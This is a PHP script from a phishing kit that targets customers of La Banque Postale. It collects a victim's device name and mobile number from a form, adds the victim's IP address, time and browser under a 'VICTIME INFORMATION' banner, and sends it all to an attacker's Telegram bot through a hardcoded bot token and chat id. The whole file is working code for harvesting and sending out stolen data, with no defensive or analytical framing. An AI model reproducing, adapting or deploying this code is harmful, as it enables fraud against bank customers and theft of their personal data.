<?php
include('get_browser.php');
include('get_ip.php');
$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');

if(isset($_POST) ){

$data = array();	

if ($_POST['DEVICE_CR'] == "" || $_POST['PHONE_CR'] == "") {
 
 
 
$data['statut'] = 'error'; 
$data['title'] = 'echec';
$data['resultat']="Veuillez saisir tout les champs";
  
 

 }
  else
  { 
$DCH_MESSAGE .= "
+=======VICTIME INFORMATION========+
| IP INFO          =".$ip."    
| TIME/DATE        =".$TIME_DATE."
| BROWSER          =".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])." 
+=========MOBILE BANQUE POSTALE========+
| DEVICE           =  ".$_POST['DEVICE_CR']."
| NUMERO MOBILE    =  ".$_POST['PHONE_CR']."
+===============================+\n";

file_get_contents("https://api.telegram.org/bot7754602986:AAGOeikgQF1YhYGFFUJSVSL_hxcpRZeVvuE/sendMessage?chat_id=-1002403728535&text=".urlencode($DCH_MESSAGE)."" );
$Page .= ' ';

$fPage = fopen("../backend/Show_system/Show_Page.txt", "w");

fwrite($fPage, $Page);


$data['statut'] = 'success'; 
$data['title'] = 'succès'; 
$data['resultat']="valider";
}

echo json_encode($data);


}